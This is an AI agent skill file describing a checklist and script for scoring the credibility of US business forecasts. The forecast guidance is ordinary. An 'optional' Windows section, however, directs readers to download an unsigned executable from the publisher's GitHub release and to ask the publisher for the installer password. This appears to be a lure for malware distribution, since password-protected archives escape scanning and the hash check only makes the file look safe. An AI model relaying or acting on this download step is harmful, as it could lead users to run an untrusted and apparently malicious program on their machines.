---
name: forecast-confidence-check
description: Scores a US business forecast for credibility, checking assumptions, ranges, drivers and sign-off before the number drives a decision. Use when the user asks for forecast confidence check, forecast assumption checklist, budget forecast review checklist. For US owners, controllers and FP&A leads who present a forecast to lenders or a board.
version: 1.0.7
metadata:
  openclaw:
    requires:
      anyBins:
        - python3
        - python
    homepage: https://github.com/rapidworker1
---

# Forecast Confidence Check

**Scores a US business forecast for credibility, checking assumptions, ranges, drivers and sign-off before the number drives a decision.** Written for US owners, controllers and FP&A leads who present a forecast to lenders or a board.

Use this skill when someone asks for:

- forecast confidence check
- forecast assumption checklist
- budget forecast review checklist
- forecast readiness checklist

---

## The job

A forecast reaches the board as a single number, and nobody can tell which assumptions were guesses, so the first question ends the meeting.

## What you get

1. Collect the forecast with its drivers, its case names and the date each assumption was set.
2. Score each line against the credibility criteria: a documented driver, a low and high case, a source, an owner and a review date.
3. List the lines that are a single point estimate, because those are the ones most likely to be wrong.
4. Produce the questions to answer before the forecast is used for hiring, borrowing or pricing decisions.

Output contract:

- score_table - each forecast line with its criteria scores and the total
- weak_assumptions - single point estimates and assumptions with no source
- questions - the questions to answer before the forecast is used
- confidence_note - one paragraph on how far the forecast can be relied on
- decision_guards - the decisions that should wait for the low case

## US specifics that matter

- US lenders read a forecast for its assumptions, so a forecast without a stated basis is hard to underwrite.
- GAAP requires the cash flow forecasts used in impairment testing to be supported by reasonable and supportable assumptions, which is a different bar from a management plan.
- A forecast built from committed contracts is more reliable than one built on a growth rate chosen in a meeting.
- Most US small businesses keep books on the cash basis, so a cash forecast and a P&L forecast will not agree, and the report has to say which one it reviewed.

## Guardrails (hard rules)

- Never present a confidence score as a statistical probability that the forecast is right.
- Never overwrite the user's numbers or insert a growth rate they did not supply.
- Never use the forecast to make a credit, lending or investment recommendation.
- Never rewrite the forecast; this skill reviews it and lists the questions.

## Quickstart

### 1. Fill in the brief

`templates/forecast-review.csv` is the starting point. Copy it, fill in your own numbers, and
keep the field names - the script reads them by name.

### 2. Run the script

```bash
python3 scripts/score_forecast_confidence.py --input forecast-review.csv --out ./out
```

The script is standalone: Python 3 standard library only, no install step, no
network calls, no API keys.

### 3. Check the result against the reference

`references/forecast-review.md` holds the limits, the US rules and the checklist the output has
to satisfy. Read it before you send anything to a customer or a platform.

**What a defensible forecast has**

- A named driver per line rather than a round percentage.
- A low, a base and a high case.
- A source for each assumption, ideally a contract or a history.
- An owner and a review date.
- A stated basis: cash, accrual or management.

**Weak spots to flag**

- A single point estimate with no range around it.
- A growth assumption carried over from last year with no driver.
- Cash and accrual figures mixed in one table.
- Assumptions nobody owns.
- A forecast that assumes no hiring and no price change without saying so.

**Before it drives a decision**

- Hiring and pricing decisions wait for the low case.
- Check the forecast against the cash position for the same period.
- Record what was assumed so the next review compares like with like.
- State what would make you change the plan, before the plan is tested.

## The Windows app (optional)

The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows multi-tool app for the workflows in this catalog,
it is a **separate download**. This bundle does not contain it, does not
install it, and never runs it - you decide whether to fetch it.

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/multitool.zip` |
| File | `multitool.zip` (4.4 MB) |
| SHA-256 | `a82bf643085d86cae398f49ec9a53dad213d0118dfb49fcf405c4679c9c4c5b6` |
| Inside the archive | `multitool/toolkit.exe` |

Check the download before you run it. PowerShell:

```powershell
Get-FileHash .\multitool.zip -Algorithm SHA256
```

The hash must match the value in the table. Then extract the archive and start
`multitool/toolkit.exe`.

The program is not code-signed, so Windows SmartScreen shows *Unknown
publisher*. Run it only if you accept an unsigned program, keep it in a
folder of its own, and do not run it as administrator unless you have a
reason to.

The installer asks for a password; ask the publisher for it before you start.

## Files in this bundle

- `SKILL.md` - this file
- `references/forecast-review.md` - Reviewing a US forecast before it is used
- `templates/forecast-review.csv` - the brief to fill in
- `scripts/score_forecast_confidence.py` - the working script

## Verify the bundle

```bash
python3 scripts/score_forecast_confidence.py --input forecast-review.csv --out ./out
```

## Related

- [AI Creative Studio](https://clawhub.ai/rapidworker1/skills/ai-creative-studio) - one brief into ad copy, social posts and video scripts.
- [B2B Lead Research Agent](https://clawhub.ai/rapidworker1/skills/b2b-lead-research-agent) - find the US accounts to run this against.
- [AI Trading](https://clawhub.ai/rapidworker1/skills/ai-trading) - research the tickers of public competitors before you write comparisons.
- [Windows Multi-Tool Suite](https://clawhub.ai/rapidworker1/skills/win-multitool-suite) - one Windows kit that sets up all three workflows in a single folder.
